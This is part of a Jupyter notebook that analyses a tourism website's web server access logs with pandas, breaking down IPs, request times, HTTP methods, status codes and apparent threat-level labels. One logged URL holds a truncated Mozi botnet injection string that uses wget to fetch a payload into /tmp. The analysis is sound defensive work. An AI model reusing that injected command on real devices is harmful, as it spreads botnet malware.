       "      <td>400</td>\n",
       "      <td>421</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1052870</th>\n",
       "      <td>33866</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>18.133.77.205</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-29 07:35:25+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>400</td>\n",
       "      <td>421</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Unnamed: 0            server_name             IP logname  \\\n",
       "189855         7321  www.sitgesanytime.com  117.235.37.51       -   \n",
       "1052503       33499  www.sitgesanytime.com  18.133.77.205       -   \n",
       "1052870       33866  www.sitgesanytime.com  18.133.77.205       -   \n",
       "\n",
       "        authenticate                       date petition  \\\n",
       "189855             -  2024-01-23 01:11:33+01:00        -   \n",
       "1052503            -  2024-01-29 07:31:58+01:00        -   \n",
       "1052870            -  2024-01-29 07:35:25+01:00        -   \n",
       "\n",
       "                                                       URL  status  bytes  \\\n",
       "189855   27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp...     400    421   \n",
       "1052503                                                NaN     400    421   \n",
       "1052870                                                NaN     400    421   \n",
       "\n",
       "        referer user-agent  level  \n",
       "189855        -          -     -1  \n",
       "1052503       -          -     -1  \n",
       "1052870       -          -     -1  "
      ]
     },
     "execution_count": 113,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"level\"]==-1][~have_rare_url]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## IP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "counts = df[\"IP\"].value_counts()\n",
    "counts.hist(bins=100, log=True)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "IP\n",
       "47.76.35.19       47504\n",
       "216.244.66.202    23356\n",
       "66.249.70.97      23275\n",
       "216.244.66.199    18887\n",
       "176.9.10.174       5279\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counts[counts > 5000]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "IP\n",
       "47.76.35.19       4.4\n",
       "216.244.66.202    2.2\n",
       "66.249.70.97      2.2\n",
       "216.244.66.199    1.8\n",
       "176.9.10.174      0.5\n",
       "                 ... \n",
       "185.41.96.22      0.0\n",
       "52.205.183.239    0.0\n",
       "3.85.176.147      0.0\n",
       "44.202.232.53     0.0\n",
       "165.154.225.25    0.0\n",
       "Name: proportion, Length: 20118, dtype: float64"
      ]
     },
     "execution_count": 130,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"IP\"].value_counts(normalize=True).round(3)*100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.3540610398647977"
      ]
     },
     "execution_count": 134,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counts[counts == 1].sum() / len(counts)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "pattern = r\"^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\"\n",
    "follow_pattern = df[\"IP\"].apply(lambda x: bool(re.match(pattern, x)))\n",
    "follow_pattern.all()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "level\n",
       "-1      0.000000\n",
       " 0      4.508540\n",
       " 3      0.000000\n",
       " 5      1.055113\n",
       " 6      0.000000\n",
       " 7     28.571429\n",
       " 10     1.218769\n",
       " 15     0.000000\n",
       "Name: count, dtype: float64"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "(df[df[\"IP\"] == \"47.76.35.19\"][\"level\"].value_counts() / df[\"level\"].value_counts()).fillna(0) * 100"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0    2024-01-22 00:00:00+01:00\n",
       "1    2024-01-22 00:00:01+01:00\n",
       "2    2024-01-22 00:00:06+01:00\n",
       "3    2024-01-22 00:00:06+01:00\n",
       "4    2024-01-22 00:00:07+01:00\n",
       "Name: date, dtype: object"
      ]
     },
     "execution_count": 148,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"date\"].head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 151,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pattern = r\"^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}\\+\\d{2}:\\d{2}$\"\n",
    "follow_pattern = df[\"date\"].apply(lambda x: bool(re.match(pattern, x)))\n",
    "follow_pattern.all()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "date\n",
       "2024-01-22    182534\n",
       "2024-01-27    149814\n",
       "2024-01-25    145334\n",
       "2024-01-26    143730\n",
       "2024-01-24    135409\n",
       "2024-01-23    133030\n",
       "2024-01-28    129153\n",
       "2024-01-29     58389\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 153,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"date\"].apply(lambda x: x.split(\" \")[0]).value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "time = df[\"date\"].apply(lambda x: x.split(\" \")[1])\n",
    "hh = time.apply(lambda x: x.split(\":\")[0])\n",
    "mm = time.apply(lambda x: x.split(\":\")[1])\n",
    "ss = time.apply(lambda x: x.split(\":\")[2])\n",
    "hh.hist(bins=24)\n",
    "plt.xlabel(\"Hour\")\n",
    "plt.ylabel(\"number of logs\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "malicious = df[df[\"level\"] > 0]\n",
    "non_malicious = df[df[\"level\"] == 0]\n",
    "time = malicious[\"date\"].apply(lambda x: x.split(\" \")[1])\n",
    "time2 = non_malicious[\"date\"].apply(lambda x: x.split(\" \")[1])\n",
    "hh = time.apply(lambda x: x.split(\":\")[0])\n",
    "hh2 = time2.apply(lambda x: x.split(\":\")[0])\n",
    "hh2.hist(bins=24, alpha=0.5, log=True)\n",
    "hh.hist(bins=24, log=True)\n",
    "plt.xlabel(\"Hour\")\n",
    "plt.ylabel(\"number of malicious logs (orange)\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Petition"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "petition\n",
       "GET        95.1\n",
       "POST        2.5\n",
       "HEAD        2.3\n",
       "-           0.0\n",
       "CONNECT     0.0\n",
       "OPTIONS     0.0\n",
       "USER        0.0\n",
       "Name: proportion, dtype: float64"
      ]
     },
     "execution_count": 195,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"petition\"].value_counts(normalize=True).round(3)*100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "petition  level\n",
       "-         -1          434\n",
       "           5            2\n",
       "CONNECT    0           29\n",
       "GET        0       997135\n",
       "           5        26218\n",
       "           10        1395\n",
       "           6          106\n",
       "           7            5\n",
       "           15           3\n",
       "HEAD       0        24297\n",
       "           5          471\n",
       "           10          30\n",
       "           7            2\n",
       "OPTIONS    0            7\n",
       "POST       0        25434\n",
       "           3         1572\n",
       "           10         216\n",
       "           5           36\n",
       "USER      -1            1\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 185,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby(\"petition\")[\"level\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "petition  level\n",
       "-         -1        99.5\n",
       "           5         0.5\n",
       "CONNECT    0       100.0\n",
       "GET        0        97.3\n",
       "           5         2.6\n",
       "           10        0.1\n",
       "           6         0.0\n",
       "           7         0.0\n",
       "           15        0.0\n",
       "HEAD       0        98.0\n",
       "           5         1.9\n",
       "           10        0.1\n",
       "           7         0.0\n",
       "OPTIONS    0       100.0\n",
       "POST       0        93.3\n",
       "           3         5.8\n",
       "           10        0.8\n",
       "           5         0.1\n",
       "USER      -1       100.0\n",
       "Name: proportion, dtype: float64"
      ]
     },
     "execution_count": 197,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby(\"petition\")[\"level\"].value_counts(normalize=True).round(3)*100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 193,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "431 out of 436 null petitions are rare urls\n",
      "431 out of 432 rare urls are null petitions\n"
     ]
    }
   ],
   "source": [
    "null_pet = df[df[\"petition\"] == \"-\"].index\n",
    "rare_urls = df[have_rare_url].index\n",
    "print(\"{} out of {} null petitions are rare urls\".format(len(null_pet.intersection(rare_urls)), len(null_pet)))\n",
    "print(\"{} out of {} rare urls are null petitions\".format(len(rare_urls.intersection(null_pet)), len(rare_urls)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "URL\n",
       "/comu/cookies.php HTTP/2.0                                            21807\n",
       "/comu/cookies.php HTTP/1.1                                             1257\n",
       "/mant/form/sqlact.php?control=S HTTP/2.0                                979\n",
       "/mant/form/form.php?taula=TD_ACTIVITATS HTTP/2.0                        364\n",
       "/mant/form/selTaules_sql.php HTTP/2.0                                   360\n",
       "                                                                      ...  \n",
       "/mant/form/form.php?taula=TD_ACTIVITATS&id=1109&idioma=es HTTP/2.0        1\n",
       "/mant/form/form.php?taula=TD_ACTIVITATS&id=1109&idioma=en HTTP/2.0        1\n",
       "/mant/form/form.php?taula=TD_ACTIVITATS&id=1109&idioma=fr HTTP/2.0        1\n",
       "/mant/form/form.php?taula=TD_ACTIVITATS&id=1109&idioma=de HTTP/2.0        1\n",
       "/action/weblogin HTTP/1.1                                                 1\n",
       "Name: count, Length: 290, dtype: int64"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"petition\"] == \"POST\"][\"URL\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0    /fr/pag492/explora-platges-i-ports-2/id12/les-...\n",
       "1    /fr/pag492/explora-platges-i-ports-2/id12/les-...\n",
       "2    /ca/noticias/84/sitges-obt%C3%A9-el-certificat...\n",
       "3    /fr/pag492/explora-platges-i-ports-2/id12/les-...\n",
       "4    /fr/pag492/explora-platges-i-ports-2/id12/les-...\n",
       "Name: URL, dtype: object"
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"petition\"] != \"POST\"][\"URL\"].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 202,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "status\n",
       "200    88.4\n",
       "301     8.6\n",
       "404     2.7\n",
       "206     0.1\n",
       "304     0.1\n",
       "403     0.0\n",
       "400     0.0\n",
       "408     0.0\n",
       "302     0.0\n",
       "401     0.0\n",
       "504     0.0\n",
       "Name: proportion, dtype: float64"
      ]
     },
     "execution_count": 202,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"status\"].value_counts(normalize=True).round(3)*100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>status</th>\n",
       "      <th>level</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"4\" valign=\"top\">200</th>\n",
       "      <th>0</th>\n",
       "      <td>951088</td>\n",
       "      <td>99.8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1492</td>\n",
       "      <td>0.2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>208</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>5</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <th>0</th>\n",
       "      <td>729</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"6\" valign=\"top\">301</th>\n",
       "      <th>0</th>\n",
       "      <td>92554</td>\n",
       "      <td>99.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>43</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>5</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>4</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>3</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"3\" valign=\"top\">302</th>\n",
       "      <th>0</th>\n",
       "      <td>97</td>\n",
       "      <td>54.2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>75</td>\n",
       "      <td>41.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>7</td>\n",
       "      <td>3.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>304</th>\n",
       "      <th>0</th>\n",
       "      <td>724</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"3\" valign=\"top\">400</th>\n",
       "      <th>-1</th>\n",
       "      <td>196</td>\n",
       "      <td>63.4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>111</td>\n",
       "      <td>35.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>2</td>\n",
       "      <td>0.6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>401</th>\n",
       "      <th>5</th>\n",
       "      <td>1</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"5\" valign=\"top\">403</th>\n",
       "      <th>5</th>\n",
       "      <td>206</td>\n",
       "      <td>63.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>65</td>\n",
       "      <td>19.9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>36</td>\n",
       "      <td>11.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>14</td>\n",
       "      <td>4.3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>6</td>\n",
       "      <td>1.8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"4\" valign=\"top\">404</th>\n",
       "      <th>5</th>\n",
       "      <td>26408</td>\n",
       "      <td>89.6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1645</td>\n",
       "      <td>5.6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1408</td>\n",
       "      <td>4.8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>20</td>\n",
       "      <td>0.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <th>-1</th>\n",
       "      <td>239</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>504</th>\n",
       "      <th>5</th>\n",
       "      <td>1</td>\n",
       "      <td>100.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              absolute  relative\n",
       "status level                    \n",
       "200     0       951088      99.8\n",
       "        3         1492       0.2\n",
       "        10         208       0.0\n",
       "        6            5       0.0\n",
       "206     0          729     100.0\n",
       "301     0        92554      99.9\n",
       "        6           43       0.0\n",
       "        3            5       0.0\n",
       "        10           4       0.0\n",
       "        15           3       0.0\n",
       "        7            1       0.0\n",
       "302     0           97      54.2\n",
       "        3           75      41.9\n",
       "        10           7       3.9\n",
       "304     0          724     100.0\n",
       "400    -1          196      63.4\n",
       "        5          111      35.9\n",
       "        6            2       0.6\n",
       "401     5            1     100.0\n",
       "403     5          206      63.0\n",
       "        0           65      19.9\n",
       "        6           36      11.0\n",
       "        10          14       4.3\n",
       "        7            6       1.8\n",
       "404     5        26408      89.6\n",
       "        0         1645       5.6\n",
       "        10        1408       4.8\n",
       "        6           20       0.1\n",
       "408    -1          239     100.0\n",
       "504     5            1     100.0"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_status = df.groupby(\"status\")[\"level\"].value_counts()\n",
    "rel_status = df.groupby(\"status\")[\"level\"].value_counts(normalize=True).round(3)*100\n",
    "pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "IP\n",
       "217.182.84.13      179\n",
       "95.60.246.144        3\n",
       "49.7.20.69           3\n",
       "85.51.224.215        3\n",
       "78.92.32.166         2\n",
       "37.29.209.127        2\n",
       "90.167.94.1          2\n",
       "77.226.251.249       2\n",
       "186.52.194.31        2\n",
       "146.112.163.38       2\n",
       "185.208.40.101       2\n",
       "65.109.54.101        2\n",
       "79.152.145.145       2\n",
       "73.142.40.11         2\n",
       "81.15.108.247        2\n",
       "193.146.1.60         2\n",
       "91.160.181.166       2\n",
       "46.25.22.83          2\n",
       "192.38.130.116       2\n",
       "162.142.125.13       1\n",
       "49.36.97.96          1\n",
       "51.182.235.238       1\n",
       "103.56.61.144        1\n",
       "73.178.221.194       1\n",
       "198.48.158.42        1\n",
       "188.77.72.120        1\n",
       "37.29.183.26         1\n",
       "165.225.92.202       1\n",
       "92.250.101.253       1\n",
       "62.57.97.103         1\n",
       "93.213.163.120       1\n",
       "49.7.21.72           1\n",
       "147.161.189.3        1\n",
       "86.8.153.136         1\n",
       "37.135.193.116       1\n",
       "203.109.147.113      1\n",
       "47.61.120.185        1\n",
       "82.116.249.2         1\n",
       "185.51.12.102        1\n",
       "164.52.0.93          1\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"status\"] == 408][\"IP\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bytes\n",
       "5150    179\n",
       "0        42\n",
       "4686      4\n",
       "5661      3\n",
       "5710      2\n",
       "5629      2\n",
       "137       2\n",
       "5593      2\n",
       "4491      1\n",
       "5708      1\n",
       "5082      1\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"status\"] == 408][\"bytes\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(petition\n",
       " -    239\n",
       " Name: count, dtype: int64,\n",
       " URL\n",
       " -    239\n",
       " Name: count, dtype: int64)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"status\"] == 408][\"petition\"].value_counts(), df[df[\"status\"] == 408][\"URL\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>server_name</th>\n",
       "      <th>IP</th>\n",
       "      <th>logname</th>\n",
       "      <th>authenticate</th>\n",
       "      <th>date</th>\n",
       "      <th>petition</th>\n",
       "      <th>URL</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>user-agent</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1956</th>\n",
       "      <td>1956</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>217.182.84.13</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:40:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>408</td>\n",
       "      <td>5150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7804</th>\n",
       "      <td>7804</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>217.182.84.13</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 01:40:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>408</td>\n",
       "      <td>5150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13212</th>\n",
       "      <td>13212</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>217.182.84.13</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 02:40:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>408</td>\n",
       "      <td>5150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17126</th>\n",
       "      <td>17126</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>217.182.84.13</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 03:40:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>408</td>\n",
       "      <td>5150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25397</th>\n",
       "      <td>25397</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>217.182.84.13</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 04:40:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>408</td>\n",
       "      <td>5150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Unnamed: 0            server_name             IP logname authenticate  \\\n",
       "1956         1956  www.sitgesanytime.com  217.182.84.13       -            -   \n",
       "7804         7804  www.sitgesanytime.com  217.182.84.13       -            -   \n",
       "13212       13212  www.sitgesanytime.com  217.182.84.13       -            -   \n",
       "17126       17126  www.sitgesanytime.com  217.182.84.13       -            -   \n",
       "25397       25397  www.sitgesanytime.com  217.182.84.13       -            -   \n",
       "\n",
       "                            date petition URL  status  bytes referer  \\\n",
       "1956   2024-01-22 00:40:58+01:00        -   -     408   5150       -   \n",
       "7804   2024-01-22 01:40:58+01:00        -   -     408   5150       -   \n",
       "13212  2024-01-22 02:40:58+01:00        -   -     408   5150       -   \n",
       "17126  2024-01-22 03:40:58+01:00        -   -     408   5150       -   \n",
       "25397  2024-01-22 04:40:58+01:00        -   -     408   5150       -   \n",
       "\n",
       "      user-agent  level  \n",
       "1956           -     -1  \n",
       "7804           -     -1  \n",
       "13212          -     -1  \n",
       "17126          -     -1  \n",
       "25397          -     -1  "
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df[\"status\"] == 408].head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>server_name</th>\n",
       "      <th>IP</th>\n",
       "      <th>logname</th>\n",
       "      <th>authenticate</th>\n",
       "      <th>date</th>\n",
       "      <th>petition</th>\n",
       "      <th>URL</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>user-agent</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>824291</th>\n",
       "      <td>84254</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>40.77.167.38</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 14:49:39+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/es/lnk35/pl349/noticies/id418/el-terramar-aca...</td>\n",
       "      <td>504</td>\n",
       "      <td>353</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "        Unnamed: 0            server_name            IP logname authenticate  \\\n",
       "824291       84254  www.sitgesanytime.com  40.77.167.38       -            -   \n",
       "\n",
       "                             date petition  \\\n",
       "824291  2024-01-27 14:49:39+01:00      GET   \n",
       "\n",
       "                                                      URL  status  bytes  \\\n",
